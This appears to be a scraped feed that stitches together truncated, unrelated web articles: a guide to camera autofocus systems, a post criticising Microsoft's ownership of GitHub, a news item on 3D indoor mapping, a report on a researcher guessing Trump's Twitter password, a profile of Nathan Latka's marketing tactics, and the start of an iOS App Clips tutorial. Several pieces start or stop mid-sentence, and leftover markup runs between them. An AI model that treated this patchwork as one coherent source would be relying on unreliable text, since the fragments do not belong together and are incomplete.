<p>For example, if you’re into portrait photography and like to use prime lenses and wide apertures then accurate focusing is critical. You need accurate autofocis to get the model’s eyes in focus in portraits like this one, taken at f1.2 with a 56mm lens.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-1.jpg" alt="Portrait of young woman taken with prime lens at a wide aperture using contrast detection autofocus" width="900" height="600" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-1.jpg"></p>
<p>The contrast detection used in mirrorless cameras is better at this than the phase detection used in digital SLR cameras.</p>
<p>If you don’t know why this is then read my article <a href="https://www.creative-photographer.com/focus-wide-apertures/">How to Focus at Wide Apertures</a>.</p>
<p>But if you’re into wildlife or sports photography, or anything that uses the AF tracking and continuous focusing abilities of your camera, then phase detection AF works better.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-2.jpg" alt="Photo of a knight riding a horse at a jousting tournament taken with a telephoto lens at a wide aperture using phase detection autofocus" width="900" height="692" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-2.jpg"></p>
<p>It should also be noted that cameras and lenses work together when it comes to AF performance. Both Canon and Nikon make high-performance super telephoto lenses that are designed to get the most out of the AF systems on their high-end cameras. That’s why so many professional sports photographers use one or the other.</p>
<p>Some cameras use a hybrid of the two systems. For example, a digital Single Lens Reflex (SLR) camera may use contrast detection AF in Live View or movie mode and phase detection AF when you look through the viewfinder.</p>
<p>Some mirrorless cameras also have phase detection AF points that work in continuous AF mode to improve AF tracking accuracy. But the mechanics of phase detection AF in mirrorless cameras is different to that in SLR cameras, as we will see further on in the article.</p>
<h2>Phase detection AF in SLR cameras</h2>
<p>In an SLR camera light passes through the lens, hits a reflex mirror and is reflected up through a pentaprism and out through the viewfinder. The aim of this type of camera design is to show you exactly what the lens is seeing in the viewfinder. It avoids the parallax errors you get at close focusing distances with rangefinder and twin lens reflex lens cameras.</p>
<p>The advantages this gave to photographers meant that the SLR camera became the camera design of choice for most photographers around 50 years ago. That has never been seriously challenged until the rise of mirrorless cameras. Many mirrorless cameras continue to use the SLR type design (with the electronic viewfinder in a hump in the center of the body) even though they are not, strictly speaking, SLR cameras as they don’t have a reflex mirror.</p>
<p>The centre of the camera’s mirror is translucent and a sub-mirror behind it reflects light down into the base of the camera body, where the AF sensor unit is positioned (the photo below shows the AF unit from the Canon EOS 50D). This is the heart of the phase detection AF system.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-5.jpg" alt="EOS 50D autofocus unit" width="600" height="410" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-5.jpg"></p>
<p>This diagram shows the paths of light through the camera body when the reflex mirror is in the down position. The mirror reflects light up into the pentaprism and out through the viewfinder. Some of the light is also reflected downwards towards the AF sensor.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-4.jpg" alt="Cut away image of digital SLR camera showing path of light through body and autofocus sensor" width="860" height="654" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-4.jpg"></p>
<p>The AF unit contains a sensor that correspond to the camera’s AF points. This is the AF sensor of the EOS 5D Mark III. The lines on the sensor match the camera’s AF point array.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-3.jpg" alt="EOS 5D Mark III autofocus sensor" width="860" height="645" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-3.jpg"></p>
<h2>Phase Detection AF in action</h2>
<p>In an SLR camera the light reflected from the sub-mirror is split into two separate images by prisms and microlenses in the AF sensor unit, each aimed at two lines on the AF sensor corresponding to the active AF point.</p>
<ul>
<li>If the images hit the two lines precisely, the subject is in focus.</li>
</ul>
<p>The distance between the two images tells the camera how much the lens is out of focus.</p>
<ul>
<li>If the two images are closer together, then the lens is focused in front of the subject.</li>
</ul>
<ul>
<li>If the two images are further apart, then the lens is focused behind the subject.</li>
</ul>
<p>The AF unit works out how far to move the lens to bring the subject into focus, and in which direction, then drives the lens to that position. It’s fast and (within limitations, see below) precise, making it ideal for tracking fast moving subjects.</p>
<h2>Limitations of phase detection AF</h2>
<p>These are the main limitations of phase detection AF.</p>
<p><strong>It doesn’t work as well in low light.</strong> The camera needs light to focus and the less of it there is, the more difficult accurate focus becomes. This applies to contrast detection AF as well.</p>
<p><strong>It may not be able to focus accurately on low contrast subjects.</strong> This also applies to contrast detection AF.</p>
<p><strong>You can’t put AF points close to the edge of the frame.</strong> The camera focuses with the lens set to its widest aperture, and the edges of the frame are always darker than the centre at this setting. Since phase detection AF doesn’t work well in low light, the vignetting makes it impractical to place AF points near the edge of the frame.</p>
<p><strong>It’s prone to errors when focusing using wide apertures.</strong> This is because phase detection AF is a partly mechanical process. The length of the light path from the lens to the AF sensor is theoretically the same as the length of the light path from the lens to the sensor.</p>
<p>But, in the real world, cameras and lenses are made to set tolerances. Such precision is too expensive and time consuming to achieve. If your particular camera and lens are at the extremes of their tolerance then it’s possible that the lens will focus slightly in front of or behind where the camera thinks it is focused.</p>
<p>This can result in focusing errors when using lenses at wide apertures (with their narrow depth of field). Most mid-range and high-end digital SLR lenses let you calibrate your lens to cancel out focusing errors.</p>
<p><strong>It doesn’t work in Live View or movie mode.</strong> The earliest SLR cameras with Live View had manual focus only in Live View and movie mode. Newer cameras use a combination of contrast detection AF and on sensor phase detection AF (see below) to achieve focus in Live View and movie mode.</p>
<h2>Sensor based phase detection AF</h2>
<p>Phase Detection AF forms part of a very accurate and precise autofocus system that allows high end SLR cameras to accurately track fast and erratically moving subjects.</p>
<p>But it doesn’t work in Live View or movie mode. In those modes, the camera’s mirror is flipped up to allow the light from the lens to reach the sensor in a continual feed. Light no longer reaches the autofocus unit.</p>
<p>This diagram shows the path of light through an SLR camera body in Live View or movie mode. The reflex mirror in the up position. The path is exactly the same through a mirrorless camera body.</p>
<p><img src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-6.jpg" alt="Cut away image of digital SLR camera showing path of light through body of digital SLR system with reflex mirror in up position, in Live View" width="860" height="654" data-recalc-dims="1" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.creative-photographer.com/wp-content/uploads/2017/04/phase-detection-contrast-detection-autofocus-6.jpg"></p>
<p>Mirrorless cameras don’t have AF sensors. Instead they take a reading from the camera’s sensor. Digital SLRs also take readings from the sensor when in Live View or movie mode.</p>
<p>Different manufacturers tackle this in different ways. So let’s take a look at how Fujifilm and Canon do it.</p>
<p>Fujfilm achieved this by adding pixels that are masked so they only receive light from one side of the lens.</p>
<p>Under each phase detection AF point lie strips of covered sensors that receive light from one side of the lens, and other sensors that receive light from the other side. The camera compares both, and when they match, knows that the subject is in focus. If the subject is out of focus, it calculates how much it needs to adjust the lens to bring the subject into focus, and drives the lens there.</p>
<p>Reviews of Fujifilm’s system indicates that it works well, but is yet to achieve the speed and tracking accuracy of high end Canon and Nikon cameras.</p>
<p>Canon’s newest technology is called Dual Pixel CMOS AF. Each pixel on the camera’s sensor is made from two photo diodes. One diode gathers light, the other is used for phase detection AF. Canon uses this technology in movie mode, to help the camera track moving subjects while shooting video. It is also used in some M series mirrorless cameras.</p>
<h2>Contrast detection AF in mirrorless and SLR cameras</h2>
<p>Contrast detection AF works by analyzing pixels on the camera’s sensor. It works on the basis that the subject is in focus when contrast is highest. To find that point it has to push the focusing point of the lens back and forth.</p>
<p>As a result contrast detection AF is slower than phase detection AF. But it’s far more accurate at focusing on still subjects. There is no need to calibrate your lens as there are no mechanical focusing errors.</p>
<p>This relative lack of speed doesn’t really matter when shooting still subjects. But it makes a big difference when tracking moving subjects. Especially when you consider that the camera has to push and pull the lens to lock focus. That’s why camera manufacturers have come up with different solutions for implementing phase detection AF in mirrorless cameras and in digital SLRs in Live View or movie mode.</p>
<h2>Conclusion</h2>
<p>The topic of autofocus can get quite complex. Understanding it fully requires a depth of technological understanding that most photographers (myself included) don’t have. This article is a simplification of the basic principles. It should help you understand how different autofocus systems work, and what the pros and cons of each type are.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>


<p>Published on <span id="published">2020-10-23</span>. Modified on <span id="modified">2020-10-25</span>.</p>
<p>Thousands of the worlds best Open Source projects are still hosting their code repositories on GitHub. Since Microsoft has purchased GitHub this has become a serious problem.</p>
<p><strong>Update 2020-10-25:</strong> This is not directly related as it could happen on other hosting platforms as well, but just a few hours after I wrote this the youtube-dl repository was taken down from GitHub by RIAA due to a <a href="https://github.com/ytdl-org/youtube-dl/">DMCA request</a>.</p>
<p>It is no news that <a href="https://en.wikipedia.org/wiki/GitHub#Acquisition_by_Microsoft">Microsoft purchased GitHub in 2018</a>, everyone knows that. Yet despite that fact thousands of the worlds most important Open Source projects continue to host their code on GitHub. People seem to have forgotten just how rotten Microsoft really is and how dangerous that situation is.</p>
<p>It is not so much the fact that many projects host their projects on GitHub, it is the fact that many projects haven't secured the code outside of GitHub! They rely fully on GitHub to maintain and protect the code.</p>
<p>Microsoft is very actively purchasing important projects related to Open Source and in April 2020 it was announced that they had now also acquired <a href="https://en.wikipedia.org/wiki/Npm_(software)">npm</a>, a JavaScript packaging vendor, for an undisclosed sum of money.</p>
<p>Perhaps the younger generation don't know anything about the past "evils" of Microsoft and naively believe that Microsoft is now the good friend to Open Source, but the truth is that all these acquisitions of Open Source projects is a business tactic that is put in place to improve Microsoft's loosing position to Open Source. It is a matter of control.</p>
<p>Just yesterday <a href="https://www.minecraft.net/en-us/article/java-edition-moving-house">Microsoft announced</a> that Minecraft will require a Microsoft account to play in 2021 and that owners of the classic version will be forced to migrate.</p>
<p>While this is not related to Open Source, it is a really good example of how bad it can get if Microsoft sometime in the future decides that projects on GitHub are required to do something which goes against these projects interests.</p>
<p>I will not name any names, because that is not important, but how in the world can any Open Source project that regards their code base as valuable not make sure that they have a completely up to date copy of every single line of code outside of GitHub!?</p>
<p>Some project developers only keep parts on the code in personal repositories, others haven't even got a backup but trust fully that GitHub will always have a working and current release of the latests commits.</p>
<p>For years people have warned about the position GitHub had in the world of Open Source because it concentrates too much of the power to make or break the community in a single entity. Having Microsoft behind the steering wheel makes the situation a thousand times worse.</p>
<p>Nobody in their right mind would ever have imagined uploading Open Source code to Microsoft servers just a decade ago. Microsoft where the archenemy of Open Source in the nineties and they deployed all kinds of dirty tactics to keep other operating systems out of the market, especially dirty tactics against Linux. In the early 2000s the then CEO Steve Ballmer said, <q>Linux is a cancer that attaches itself in an intellectual property sense to everything it touches.</q> And for many years they tried to gain control over Linux and manipulated the market in different ways in order to "crush the competition". When they realized they couldn't do that and that the battle was lost, they deployed a new tactic in which they instead try to make money of Linux, which is what that are doing now in a lot of areas, and which is why they seem "friendlier" to the Open Source community.</p>
<p>I myself do have some code residing on GitHub, but of course I also have multiple up-to-date clones and backups elsewhere. However, having the worlds largest repository of important Open Source code reside in the hands of Microsoft is just madness. Why haven't all the major projects migrated? Running a self-hosting Git server isn't that difficult and there even exists several solutions that are pretty solid.</p>
<p>More and more of all the good stuff about Open Source and community driven development and sharing of resources, code and experience is slowly getting either gobbled up or ruined and massacred by big corporations or economically based foundations. Why is it that as soon as money enters into the picture so many things are turned into "crap"? Of course, greed is the answer, but an even more important question than that is: Why is it that we have stopped caring?</p>
<p>Large projects should self-host their repositories in order to stay completely independent, but some alternative solutions to the more popular services such as GitHub, GitLab and BitBucket does exist (not an exhaustive list):</p>

UT PhD-student Shayan Nikoohemat created an algorithm that can accurately generate 3D models of the insides of large buildings from point clouds.</b></p><p>Indoor 3D models are the digital twins of building interiors. The 3D models could be used by first responders to get a good impression of large buildings, like shopping malls, a hospital or a sports complex, on their way to the emergency. 2D maps represent important information – like the location of emergency exits – on tangled floor plans, making them difficult too read quickly and after each reconstruction, these maps are outdated. “Sometimes, these maps are so outdated that the real building looks completely different than the floor plans. We need a fast and reliable approach to create the digital 3D model of interiors.”, says Shayan.</p><h2><a id="from-point-clouds-to-3d-map"></a>From point clouds to 3d map</h2><p>Luckily, laser scanners can quickly scan a whole building after every reconstruction. However, these scanners create point clouds, unstructured data which still has to be converted into a 3D model. The data doesn’t know if a scanned point is a wall, an exit or, for example, a table. According to Shayan, his program solved this: “For my PhD thesis, I created&nbsp;algorithms that automatically understand the data and can create 2D and 3D maps. We can detect and model doors, stairs, obstacles and navigable areas which are crucial data for the emergency planning.”</p><p><img src="https://1348661504.rsc.cdn77.org/.uc/ia68fda4b010288850e01584947034c146ab17af56d340701c4eb00bf0080/u4spzp0rofycx9foknvzw.png" alt="" width="235" height="191"><img src="https://1348661504.rsc.cdn77.org/.uc/i90ed1dbe010289850e01584947033c8b580b7352190d0701c4f300a40080/dmfesmsqurzdg6at3vcxgw.png" alt="" width="243" height="164"> </p><p><i>Figure 1: The point clouds and final 3D Model of the fire brigade building in Haaksbergen</i></p><h2><a id="recognizing-elements"></a>Recognizing elements</h2><p>The algorithm can recognize different structural elements such as walls, slabs, ceilings, and openings.

During his postdoc, he will further develop the system to also work for individual items.

Gevers took screenshots when he had access to Trump’s account. These screenshots were shared with <i>de Volkskrant </i>by the monthly opinion magazine&nbsp;<a href="https://www.vn.nl/trump-twitter-hacked-again/" target="_blank">Vrij Nederland</a>. Dutch security experts find Gevers’ claim credible.</p><p data-element-id="f7d4-df7f-98ec-67eb-d049-540f-292a-5617">The Dutchman alerted Trump and American government services to the security leak. After a few days, he was contacted by the American Secret Service in the Netherlands. This agency is also responsible for the security of the American President and took the report seriously, as evidenced by correspondence seen by de Volkskrant. Meanwhile Trump’s account has been made more secure.</p><p data-element-id="cd30-cedb-07c2-93d7-a663-5828-30a5-5d9a">This is not the first time that Dutch hackers succeeded in taking over Donald Trump’s Twitter account. The first time was four years ago, just before the 2016 elections, when three hackers jointly managed to retrieve Trump’s password and access his account. That someone has now succeeded again, is remarkable. During the previous presidential elections Russian hackers attempted to influence the elections on a large scale. Subsequently, social media have taken various steps to prevent manipulation.</p><p data-element-id="cb67-ef02-5e43-1c58-e530-8e49-5d42-7cd2">Today as well, barely three weeks before the presidential elections, attempts are being made from Russia and Iran to digitally influence the elections. Obviously, the President’s Twitter account is a target too. Twitter declines to respond on the record, stating that they never comment on security measures for individual accounts. Ronald Prins, founder of security company Hunt &amp; Hackett and one of the best-known Dutch security experts, says: ‘I’ve known Victor Gevers for quite a few years. He has a reputation of devoting his life to finding vulnerabilities and always adopts a very ethical attitude in doing so. On the basis of what I know and have seen, his claim seems credible.’</p><h3 data-element-id="3cd7-0aef-c61e-659e-e0e2-9543-03a8-128f">2016 hack</h3><p data-element-id="720f-405b-63d6-f369-e9e8-6270-6c66-658a">Victor Gevers was also one of the three hackers who logged into Trump’s account in 2016. ‘That we would succeed in doing it again so soon, was not planned’, he says about the buildup to the action. The reason for making another attempt to hack Trump’s account was the reporting in the US about Hunter Biden. A hard disk owned by presidential candidate Joe Biden’s son was supposedly stolen or hacked – also because Hunter Biden used an easy to guess password (Hunter02). Gevers is familiar with leaked databases of old passwords and searched these for Hunter Biden’s data. After analysing these old databases, he felt that the information was incorrect. Hunter Biden used other passwords. Gevers: ‘I could tell that it wasn’t his password.’</p><p data-element-id="75db-2de2-faf8-fc31-16d0-d99f-b879-3ccd">It gives him the idea to check how good the security of verified Twitter accounts actually is. He looks at the account of Susan Rice, the former US national security adviser, and at that of Joe Biden. And also takes a look at Donald Trump, while he’s at it. ‘Doing spot checks, that’s my work: look for any leaks in security.’</p><p data-element-id="d4fd-0bc3-c406-a8b0-3268-6c9e-8769-2843">Earlier discoveries by Gevers include an enormous Chinese database with the location data of 2.7 million inhabitants of Xinjang – China’s largest province and home to the Uyghurs. The poorly secured database contained all kinds of personal data: people’s ID number, nationality, phone number, date of birth, photos, employer, but also GPS coordinates of the places these individuals had visited. The existence of this database made it even clearer how meticulously China is monitoring the Uyghur minority in the country.</p><p data-element-id="45f1-e3ef-2f67-eaca-666a-a367-2947-c3e4">On Friday morning, almost absentmindedly, Gevers tries a number of passwords and their variations. On the fifth attempt: bingo! He tries ‘maga2020!’ (short for make America great again) and suddenly finds himself in the Twitter account of the American President. He is flabbergasted. Gevers: ‘I expected to be blocked after four failed attempts. Or at least would be asked to provide additional information.’ None of that.</p><p data-element-id="0a49-c680-a98e-21e9-d291-70bc-18bf-975f">On that Friday morning, Gevers has access to what is perhaps the most important Twitter account in the world and is in a position to send a message to 87 million people, the attentive world press, and government leaders. Gevers: ‘I did think: “Here we go again”.’</p><h3 data-element-id="5342-211d-6946-9cf2-ebf8-89fd-fcd1-b8c2">Illegal</h3><p data-element-id="2da9-1ce3-bc38-1f09-e397-5636-d20b-c1a1">After all, hacking an account is illegal. If Gevers wants to make it clear that he is acting with good intentions, he will have to proceed responsibly and document his steps. He takes screenshots. Then he sends an email to Donald Trump – ‘I still had an old email account of his’ – and sends a copy to the American organisation for digital security. He kindly advises Trump to take extra security measures. And perhaps use a somewhat longer password. Gevers even suggests one: !IWillMakeAmericaGreatAgain2020!, and adds instructions for activating two-step verification. ‘But I didn’t get a reply.’</p><p data-element-id="f6ea-8910-66b0-bf9a-95b6-b615-5fea-8aaf">So, he tries to warn others. Trump’s campaign team, his family. He sends messages via Twitter asking if someone will call Trump’s attention to the fact that his Twitter account is not safe. He tags the CIA, the White House, the FBI, Twitter themselves. No response.</p><p data-element-id="aac2-5921-f32c-921b-6962-09da-fe3a-ed47">Gevers: ‘Then on Saturday, I suddenly saw that two-step verification for the account had been activated.’ Two days later, in the evening, he receives an email from the American Secret Service. ‘Friendly. They were interested in my information. I forwarded everything to them.’ On Tuesday they speak digitally. They thank Gevers, telling him that they were unaware of the security leak. This still leaves the security researcher with a number of questions: ‘Why is it possible for someone from a different time zone to log into such an important account? Why doesn’t Twitter demand better passwords? If I can access his account, then foreign nations can do so as well, right? Why aren’t the persons who are supposed to protect the President informed when someone reports that his account is unsafe?’</p><h3 data-element-id="6701-b1b1-7279-551d-015e-e20b-5efc-6540">Surprisingly easy</h3><p data-element-id="c0f4-6fcc-64af-62c3-2b8d-84c3-109f-6fac">Matthijs Koot, security researcher at Secura, is also astonished at how easy it was for Gevers to take over Trump’s account. ‘To put it harshly: people who in the year 2020 still ignore basic advice on online security are a potential danger to themselves and to those around them.’</p><p data-element-id="47c2-0c2c-b48f-fc57-7b10-7e05-6d7f-065f">According to Koot, these risks also affect others. ‘Today, we are increasingly interconnected, which means that a hack of one individual’s account or computer may also undermine the privacy and security of others. After all, via Trump’s account you can also see private messages sent to him or refer others to links containing malware or to a fake login page.’ This raises the question of how responsible Twitter is when it comes to additional security measures. Koot: ‘They should either compel people to use additional authentication or, if people really don’t want this, make them use a complex password. The days of logging in with just a weak password are over.’</p><p data-element-id="364a660b-32af-4ff8-b17b-8a49a27d61d8"><span>Twitter declines to respond to questions. The question remains why Trump was using such a weak and simple password. Gevers has a possible explanation: ‘Trump is over 70 – elderly people often switch off two-step verification because they find it too complicated. My own mother, for instance. For younger generations digital security is more self-evident.’</span></p></section></section></div>]]>

    <p>I consider Nathan to be one of my mentors even though I’ve <a href="https://sive.rs/ment">never talked to him</a>.</p>

<p>Okay, technically that’s not quite true. I exchanged Twitter DMs with him once. But this story is a perfect example of one of the key lessons I learned from him. So more on that in a moment.</p>

<p>And this last sentence is, in fact, a great example of one of the other lessons I learned from him (“Understand and leverage emotional triggers”). Apparently I’ve not just learned a thing or two from him but am also slowly able to implement the learning.</p>

<p>In case you wonder who Nathan Latka is, I created this little diagram.</p>

<p><img src="https://jakobgreenfeld.com/images/nathan_latka.svg" alt=""></p>

<p>Let’s dive in.</p>

<h2 id="build-the-attention-first-the-product-second">Build the attention first, the product second</h2>

<p>One of Nathan’s <a href="https://nathanlatka.com/60-second-blog-setup/">favorite mantras</a> is “Win peoples time and their money will follow.”</p>

<p>It’s always easy to read this kind of line, feel inspired, and then quickly forget about it. But Nathan learned the “attention first, product second” lesson through first-hand experiences and it’s obvious to what extent he’s internalized it.</p>

<p>He started his entrepreneurial journey by selling custom-made facebook pages. One thing he quickly noticed is just how hard it is to get the right kind of eyeballs onto your product.</p>

<p>His main job at the time was to negotiate with affiliates, bloggers and journalists, who had access to large distribution channels. And he hated doing this.</p>

<p>What further helped him to understand the power of media brands relative to actual products was <a href="https://www.goodreads.com/book/show/131533.Bloomberg_by_Bloomberg">Michael Bloombergs biography</a>.</p>

<p>Thus he decided that for his next venture it’ll be a much smarter approach to build the distribution channel first and pump the product later through it. This is exactly what he did.</p>

<p>He started a podcast, grew it for a few years and now offers relevant products to his audience.</p>

<blockquote>
  <p>“Wow, the real power here is not necessarily building a software company, but it’s building a media business that locks down distribution in the industry you want to own.”</p>
</blockquote>

<h2 id="anything-is-hackable">Anything is hackable</h2>

<p>Nathan is a hacker in the purest sense of the word. He always starts by studying what the most successful players are doing and all the implicit rules people follow, so that he can then break them systematically to achieve his goals.</p>

<p>Here’s, for example, how he approached his podcasting venture:</p>

<ul>
  <li>A key metric if you want to attract high-quality guests, sponsors and the attention of media outlets is the total number of downloads.</li>
  <li>To game this metric he decided to release lots of short episodes. Each of his episodes is just 15 minutes long and he releases a new episode each day. If you have 1000 episodes, you just need 1000 downloads per episode to reach the magical number of 1,000,000 total downloads.</li>
  <li>People discover new podcasts either by searching for specific terms or through top lists. After realizing this he developed a plan for each of the two discovery methods.</li>
  <li>Using Google Trends he learned that many people search for the term “top entrepreneur podcast”. Hence he simply called his podcast “The Top Entrepreneur Podcast”.</li>
  <li>He recorded 15 episodes before he launched. Then he sent an email to his guests that <a href="https://growthhackers.com/amas/upcoming-jan-21-ama-with-nathan-latka-10m-dl-podcast-host-wsj-best-selling-author-25k-copies-founder-saas-database-getlatka-com">said</a>: “I’m giving launch day priority to those who commit to emailing their list their episode. Will limit to 10 on launch day. You in?”. (This strategy is known as “elephant bumping”. To quote <a href="https://www.today.com/popculture/warren-buffett-billionaire-s-tell-all-bio-wbna26888245">Warren Buffet</a>: “Anytime a bunch of big shots get together you can get people to come, because it reassures them if they’re at an elephant-bumping that they’re an elephant too.”) Hence at launch day, he released ten episodes which were heavily advertised by his guests. In total, his podcast was mentioned on more than three million emails. This was enough to get the podcast into the top charts.</li>
</ul>

<p>He did similar things when he launched his <a href="https://www.nathanwlatka.com/magazine">magazine</a> and his <a href="http://book.nathanlatka.com/">book</a>.</p>

<p>There are also lots of smaller examples that demonstrate how Nathan tries to hack everything. For example, instead of linking to his Twitter profile and Youtube channel like everyone does, he uses a link that immediately asks anyone who clicks it if they want to follow him. For example, instead of <a href="https://twitter.com/NathanLatka">https://twitter.com/NathanLatka</a> he uses <a href="https://twitter.com/intent/user?screen_name=nathanlatka">https://twitter.com/intent/user?screen_name=nathanlatka</a>. And instead of <a href="https://www.youtube.com/user/NathanLatka">https://www.youtube.com/user/NathanLatka</a> he uses <a href="https://www.youtube.com/user/NathanLatka?sub_confirmation=1">https://www.youtube.com/user/NathanLatka?sub_confirmation=1</a>.</p>

<blockquote>
  <p>“I’m like, this is a new board game to play.”</p>
</blockquote>

<h2 id="leverage-everything-you-have">Leverage everything you have</h2>

<p>Nathan is a master at leveraging.</p>

<p>The fact that he sells products he created himself to his audience is just the most obvious example. He also, for example, always reaches out to all the CEOs he intereviewed on the podcast to get new ventures started. It was precisely by leverging this email list that allowed him to get his book and magazine started.</p>

<p>He leverages the podcast not just for distribution but also for product creation. For example, he simply created a spreadsheet with data points his podcast guests gave him and then sold it. And exactly the same data is used to fill pages in his magazine.</p>

<p>Another great example is that every time a writer appeared on his show, he took a screenshot of their Amazon sales rank at the day the podcast went live and the day before. He then used this proof that he can help to sell books to negotiate a great book deal.</p>

<p>Similarly, he leveraged a screenshot of his podcast’s ranking at launch day to secure new interview partners.</p>

<p>He’s also happy to trade appearances in his show, his magazine, his book (as described above), his email list, or on his Instagram account. For him, almost anything is something to barter with. For example, he trades Instagram posts for free hotel stays or rental cars and appearances in his podcast for keynotes at the events of his interview partners or email blasts.</p>

<p>And last but not least, he extensively uses software, virtual assistants, and systems he developed to leverage his own time as much as possible. More on that below.</p>

<blockquote>
  <p>“Like as long as you’ve got the sort of genes to not be scared to like swing, swing, swing, swing, swing. It’s just a matter of time before you hit that one thing that really works. You could have 99 things not work and one thing worked really well and that’s all you need. Everyone forgets about the things that don’t work. I mean, does anyone talk about the Amazon Fire Phone anymore that failed miserably?”</p>
</blockquote>

<h2 id="give-yourself-permission-to-dream-big">Give yourself permission to dream big</h2>

<blockquote>
  <p>“I’ve always thought that each person invented himself … that we are each a figment of our own imagination. The problem is, most people have no imagination.” - David Geffen</p>
</blockquote>

<p>This is a quote from Nathan’s book. And it leads to another perfect example of how he breaks an implicit rule everyone is living by.</p>

<p>Most people are afraid to dream big. And those few who dare to dream, do it in private. But not Nathan. He loves to set big, audacious goals and tell other people about them.</p>

<ul>
  <li>Before his podcast launched he emailed potential guests and told them that the show will have a million downloads by the end of the year. This was a somewhat audacious claim since he didn’t have a large following at the time. But by putting his big vision out there (and by working hard, of course) he was able to make it a reality.</li>
  <li>Before he had a book deal, he told the CEOs on his email list that it’ll be a massive bestseller. This way, he was able to convince some of them that an appearance in it was valuable and used this, as described below, to pre-sell his first copies.</li>
  <li>Before he launched his magazine, he reached out to his email list and <a href="https://www.indiehackers.com/podcast/171-nathan-latka-of-founderpath">told everyone</a> that “it’ll be the most expensive magazine in the world. Every VC is going to read it.” This convinced at least one of them that an appearance on its cover is valuable and hence led to his first magazine sales.</li>
</ul>

<p>Of course, it’s risky to make this kind of bold claims. But it’s only by making them that he was able to achieve what he promised. An example he gives is that he could easily use the money he earned by pre-selling his bestseller-to-be, to buy enough ads to turn it into a bestseller.</p>

<p>A strategy he recommends is to block off 10 minutes once a week just to write big dreams into a notebook. And once you’ve identified your big visions, you start putting them out there and capitalize on the momentum that starts building.</p>

<blockquote>
  <p>“You make things happen by how confidently you say them, and that’s key.”</p>
</blockquote>

<h2 id="understand-and-leverage-emotional-triggers">Understand and leverage emotional triggers</h2>

<p>Nathan recently published a <a href="https://www.indiehackers.com/post/how-my-side-project-hit-110-424-in-sales-9-tactics-3-scripts-5-hacks-d4ea9498fa">long case study</a> on Indie Hackers that started with:</p>

<blockquote>
  <p>“Even my mom laughed at me.
More on her in a second.”</p>
</blockquote>

<p>This is a perfect example of another lesson that Nathan has internalized: If you want people’s attention, curiosity is your best friend. The way to do this, as perfectly demonstrated in the opening lines above, is to create an open loop that directly correlates with whatever it is you’re trying to get attention on.  (In the copywriting community these are known as “curiosity gaps”.)</p>

<p>Just have a look at how the <a href="https://www.youtube.com/watch?v=OnupuW8wqGI">videos</a> on his YouTube channel start, or how his <a href="https://soundcloud.com/nathan-latka/unstack-cms-all-in-one-hits">podcast episodes</a> always start with snippets that make you curious.</p>

<p>Creating these curiosity loops is what he consideres to be one of his core competencies and one of the few things he wasn’t able to outsource so far.</p>

<p>And the focus on people’s curiosity is also apparent in all of his headlines and even his products.</p>

<ul>
  <li>A core element of his latest product, <a href="https://founderpath.com/">Founderpath</a>, is that it calculates a “SaaS Credit Score” for founders who sign up. It seems like a safe bet that people will be curious to know what their personal score is.</li>
  <li>A previous project, titled <a href="https://www.producthunt.com/posts/operation-pie">Operation Pie</a>, similarly offered SaaS founders to compare their statistics to those of 1000+ others.</li>
  <li>He came up with the idea to publish data tables at <a href="http://getlatka.com/">GetLatka.com</a> and his magazine because he noticed that it’s always this kind of content that sparkes his own curiosity when he browses other magazine like <a href="https://www.inc.com/magazine">Inc.</a>.</li>
</ul>

<p>Another emotional trigger that Nathan loves is people’s ego.</p>

<ul>
  <li>He pre-sold copies of his book by offering that if the CEO committed to spending $5,000 on copies, he’ll feature them in his book. He was able …</li></ul></div></div>

<![CDATA[How to Create App Clips for iOS 14]]>

October 22, 2020 | https://exyte.com/blog/how-to-create-app-clips | <a href="https://web.archive.org/web/*/https://exyte.com/blog/how-to-create-app-clips">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>At WWDC20 Apple showed many exciting updates and innovations, but my favourite addition this year has been App Clips. With our phones bursting with installed apps, App Clips could be the right solution for iOS users that prefer minimalism, and for many day to day use cases, such as ordering food in coffee shops, short-term renting or location-specific experiences (like shopping mall maps).</p>
<h2>Overview</h2>
<p>An app clip is a lightweight subset of your app, available as a part of the same Xcode project. Each app clip should perform its particular flow quickly and only when needed. One app can provide multiple app clip experiences configured with App Store Connect.</p>
<p>An app clip experience on your device usually starts with performing an invocation, which can be done by scanning a QR code, reading an NFC tag, etc. Since app clips are small parts of the app (&lt;10Mb), they can load very fast. If the user has the full application version installed, tapping the suggestion card on the screen will launch the app instead of the app clip.</p>
